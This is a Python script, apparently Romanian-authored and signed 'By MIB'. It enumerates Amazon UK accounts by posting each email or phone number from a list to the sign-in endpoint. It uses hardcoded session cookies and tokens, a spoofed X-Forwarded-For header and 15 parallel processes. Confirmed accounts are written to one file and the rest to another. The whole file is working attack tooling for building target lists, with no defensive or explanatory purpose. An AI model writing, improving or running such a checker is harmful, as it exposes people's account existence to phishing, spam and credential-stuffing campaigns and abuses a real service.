import requests,urllib3
from multiprocessing import Pool
requests.packages.urllib3.disable_warnings()
import time

class Amazon():
	def __init__(self,num):
		self.url  = "https://www.amazon.co.uk/ap/signin"
		self.num = num
		
	def check(self):
		cookies = {
			"session-id": "258-2934496-5771656",
			"session-id-time": "2383042777l",
			"session-token": "lAUVA36SFeiYliUadZi8QYJedM1vRUXU+48YuCu3D/Hia15ikxFBBRJZIsuL39593oG2ab2rtZdhXQ6MSH8icg751VPxad5fcTJ24PYDkf+yrN/2ueFuMMlK0+2K6ZYLLLB2y5+jNX7L3GE9YxdgPsgw9SOuIzSkLySLJ6zB1UCHLZjKHIsNM3LsqCpJp8uZB9YR2DtCL5+u+LFdwytrGNAxvhULYGa6/uhCiPFjZeGrdAceQQmrDwsMKCBR9FD9cWX330ht4zyu1ICTslr2WWb338y/mYGYwCo19u5g/5TXqXBlI0IbU7j7gLH2PETJ8zYGuS+q/QScteTUpOEExVm3e5vyXe1Og0FAe/IeMVg=",
			"ubid-acbuk": "261-8046819-3407229"
		}
		headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate","DNT":"1", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://www.amazon.co.uk", "Connection": "close", "X-Forwarded-For": "127.0.0.1", "Referer": "https://www.amazon.co.uk/ap/signin", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1"}
		data = {
			"appActionToken": "hea9TlKeLt3MMRw368D3-nBBRts8yHw0kFAv2RIKhaM=:2",
			"appAction": "SIGNIN_PWD_COLLECT",
			"subPageType": "SignInClaimCollect",
			"openid.return_to": "ape:aHR0cHM6Ly93d3cuYW1hem9uLmNvLnVrLz9yZWZfPW5hdl9zaWduaW4=",
			"prevRID": "ape:MTZXV1IzODM2RVNFUlBTVk1HU1Y=",
			"workflowState": "eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.ICywmX9tVgH87D_DGxvZmsr65olhGaJE1sV-yHeSjJNcj1kEghMjJw.J0BI9FHZwAekzU7m.dN-8zbE-PNbVwhKo3IrG0bgZu9WsfnycI8aA4irRh4L3ND0PGZ8muy914SFfScBBwWzdYlgqWNldcWzOncwx6h4TNucC0rkmAiTiG_VPRaTDtqWbmE_D-XhOR34EjR10XyRnwg9K_9Jh_pBuYQcBMYrPXoqbr5gtUEjbVx9wHbMLfsMVX8_jLUb7kjXXo1C6rnFm5wsiHXfHrApkxHhAFAwS9iwCjixseVgEfvMw7ZOPDI7iM7wzLkSE50EbobNQkt60H1O1GPeeICrj81X3XM12HHcfErSb-hRZYv5VTVxxVr-l-0M.0HiOGKLz8yv3Kovf6sr6_Q",
			"email": self.num,
			"password": "",
			"create": "0",
			"metadata1": "ECdITeCs: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"
		}
		res = requests.post(self.url, headers=headers, cookies=cookies, data=data).text
		
		if "ap_change_login_claim" in res:
			return True,res
		elif "Ha surgido un problema" in res:
			return False,res
		else:
			return False,res

class INDEx():
	def __new__ (self):
		print("""
		
Cel mai bun mod de a-ți prezice viitorul este să-l creezi. - 

		Veți reuși pentru că majoritatea oamenilor sunt leneși.

				By MIB

		
		""")


def fun_action(num):
    num = num.strip()
    
    if num.isnumeric() and "+" not in num:
        num = "%s" % num
    elif "@" in num:
        pass
    else:
        pass
            
    while True:
        try:
            A, Error = Amazon(num).check()
            
            if A:
                with open("VAMANEW.txt", "a") as ff:
                    ff.write("%s\n" % num)
                print("[+] Yes ==> %s" % num)
                time.sleep(1)
                break
            else:
                with open("FARAAMA.txt", "a") as ff:
                    ff.write("%s\n" % num)
                print("[-] No ==> %s" % num)
                time.sleep(1)
                break
        except:
            pass
        finally:
            time.sleep(1) 
		
def main():
	
    email = open(input("[-] List Name : "), "r", encoding="Latin-1").read().splitlines()
    num_processes = 15
    with Pool(num_processes) as p:
        p.map(fun_action, email)


if __name__ == "__main__":
	INDEx()

	main()
